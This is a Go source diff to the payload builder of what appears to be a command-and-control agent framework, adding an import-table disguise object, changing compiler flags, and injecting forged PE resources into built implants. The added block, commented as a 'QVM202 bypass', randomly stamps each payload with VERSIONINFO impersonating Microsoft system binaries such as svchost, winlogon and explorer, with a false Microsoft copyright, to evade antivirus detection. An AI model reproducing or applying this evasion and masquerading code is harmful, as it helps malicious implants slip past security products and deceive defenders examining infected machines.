@@ -457,10 +457,10 @@ var (
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "Connector", "crt", "Crypt", "Downloader", "Encoders", "IatDisguise", "indirect_syscall", "IndirectSyscall", "JobsController", "LdrResolve", "MainAgent", "MemorySaver", "OpsecGadget", "OpsecSleep", "OpsecThread", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	// Match src_beacon/Makefile COMMON_FLAGS (no global -masm=intel; no -fpermissive — Clang rejects it).
-	CFlags = "-c -Os -fno-lto -fno-unroll-loops -fno-rtti -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -mrdrnd -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types -Wno-error=anonymous-struct -w -fPIC"
-	LFlags = "-Os -fno-lto -s -Wl,-s,--gc-sections,--no-insert-timestamp,--exclude-libs,ALL -mwindows"
+	CFlags = "-c -Os -fno-lto -fno-unroll-loops -fno-rtti -fno-unwind-tables -fno-strict-aliasing -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types -Wno-error=anonymous-struct -w"
+	LFlags = "-Os -fno-lto -s -Wl,-s,--gc-sections,--exclude-libs,ALL -mwindows"
 )
 
 func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
@@ -859,6 +859,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		buildPath = tempDir + "/file.exe"
 		Filename += ".exe"
 		if iatHide {
+			postLibs += " -lkernel32"
 			Files += ObjectDir + "/entry_exe" + Ext + " "
 			lFlags += " -Wl,-T," + linkerLd
 			if generateConfig.Arch == "x86" {
@@ -872,7 +873,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		buildPath = tempDir + "/svc.exe"
 		Filename = "svc_" + Filename + ".exe"
 		if iatHide {
-			postLibs += " -ladvapi32"
+			postLibs += " -lkernel32 -ladvapi32"
 			Files += ObjectDir + "/entry_svc" + Ext + " "
 			lFlags += " -Wl,-T," + linkerLd
 			if generateConfig.Arch == "x86" {
@@ -987,6 +988,112 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			return nil, "", fmt.Errorf("windres: %w", err)
 		}
 		Files += resObj + " "
+	}
+
+	// Inject VERSIONINFO + RT_MANIFEST for PE legitimacy (QVM202 bypass)
+	if generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL" {
+		var rsrcTag [4]byte
+		_, _ = crand.Read(rsrcTag[:])
+		rsrcBase := fmt.Sprintf("r%x", binary.BigEndian.Uint32(rsrcTag[:]))
+
+		manifestXML := "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n" +
+			"<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n" +
+			"  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n" +
+			"    <security>\n" +
+			"      <requestedPrivileges>\n" +
+			"        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n" +
+			"      </requestedPrivileges>\n" +
+			"    </security>\n" +
+			"  </trustInfo>\n" +
+			"  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n" +
+			"    <application>\n" +
+			"      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n" +
+			"      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n" +
+			"      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n" +
+			"      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n" +
+			"    </application>\n" +
+			"  </compatibility>\n" +
+			"  <dependency>\n" +
+			"    <dependentAssembly>\n" +
+			"      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"/>\n" +
+			"    </dependentAssembly>\n" +
+			"  </dependency>\n" +
+			"</assembly>"
+
+		manifestPath := tempDir + "/" + rsrcBase + "_manifest.xml"
+		if err := os.WriteFile(manifestPath, []byte(manifestXML), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("manifest write: %w", err)
+		}
+
+		// Per-build randomized VERSIONINFO strings
+		vfRand := rand.Uint32()
+		vMajor := 1 + int(vfRand&3)
+		vMinor := int((vfRand>>2)&7)
+		vPatch := int((vfRand>>5)&0xFFF)
+		vBuild := int((vfRand>>17)&0x7FFF)
+
+		type viEntry struct{ company, desc, internal, orig, product string }
+		viPool := []viEntry{
+			{"Microsoft Corporation", "Host Process for Windows Services", "svchost", "svchost.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Explorer", "explorer", "explorer.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Command Processor", "cmd", "cmd.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Notepad", "notepad", "notepad.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Logon Application", "winlogon", "winlogon.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "WMI Provider Host", "WmiPrvSE", "WmiPrvSE.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Spooler SubSystem App", "spoolsv", "spoolsv.exe", "Microsoft Windows Operating System"},
+			{"Microsoft Corporation", "Windows Task Manager", "taskmgr", "taskmgr.exe", "Microsoft Windows Operating System"},
+		}
+		vi := viPool[int(vfRand>>20)%len(viPool)]
+
+		rcContent := "1 VERSIONINFO\n" +
+			fmt.Sprintf("FILEVERSION     %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
+			fmt.Sprintf("PRODUCTVERSION  %d,%d,%d,%d\n", vMajor, vMinor, vPatch, vBuild) +
+			"FILEFLAGSMASK   0x3fL\n" +
+			"FILEFLAGS       0x0L\n" +
+			"FILEOS          0x40004L\n" +
+			"FILETYPE        0x1L\n" +
+			"FILESUBTYPE     0x0L\n" +
+			"BEGIN\n" +
+			"    BLOCK \"StringFileInfo\"\n" +
+			"    BEGIN\n" +
+			"        BLOCK \"040904B0\"\n" +
+			"        BEGIN\n" +
+			fmt.Sprintf("            VALUE \"CompanyName\", \"%s\"\n", vi.company) +
+			fmt.Sprintf("            VALUE \"FileDescription\", \"%s\"\n", vi.desc) +
+			fmt.Sprintf("            VALUE \"FileVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
+			fmt.Sprintf("            VALUE \"InternalName\", \"%s\"\n", vi.internal) +
+			"            VALUE \"LegalCopyright\", \"Microsoft Corporation. All rights reserved.\"\n" +
+			fmt.Sprintf("            VALUE \"OriginalFilename\", \"%s\"\n", vi.orig) +
+			fmt.Sprintf("            VALUE \"ProductName\", \"%s\"\n", vi.product) +
+			fmt.Sprintf("            VALUE \"ProductVersion\", \"%d.%d.%d.%d\"\n", vMajor, vMinor, vPatch, vBuild) +
+			"        END\n" +
+			"    END\n" +
+			"    BLOCK \"VarFileInfo\"\n" +
+			"    BEGIN\n" +
+			"        VALUE \"Translation\", 0x409, 1200\n" +
+			"    END\n" +
+			"END\n" +
+			"\n" +
+			"1 24 \"" + rsrcBase + "_manifest.xml\"\n"
+
+		rcPath := tempDir + "/" + rsrcBase + ".rc"
+		rsrcObj := tempDir + "/" + rsrcBase + ".o"
+		if err := os.WriteFile(rcPath, []byte(rcContent), 0600); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("resource rc write: %w", err)
+		}
+
+		windres := "x86_64-w64-mingw32-windres"
+		if generateConfig.Arch == "x86" {
+			windres = "i686-w64-mingw32-windres"
+		}
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling PE resources (windres)...")
+		if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, windres, "-O", "coff", "-i", rsrcBase+".rc", "-o", rsrcBase+".o"); err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("windres: %w", err)
+		}
+		Files += rsrcObj + " "
 	}
 
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Output format: %s, Filename: %s", generateConfig.Format, Filename))
